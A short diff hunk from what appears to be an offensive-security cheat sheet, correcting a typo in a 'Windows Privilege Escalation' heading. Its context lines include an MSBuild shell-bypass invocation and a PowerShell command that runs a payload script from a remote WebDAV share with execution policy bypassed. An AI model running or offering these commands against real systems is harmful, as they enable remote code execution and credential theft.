@@ -791,7 +791,7 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
 
-# Windows Privilige Escalation
+# Windows Privilege Escalation
 
 Get hash of current user
 ```
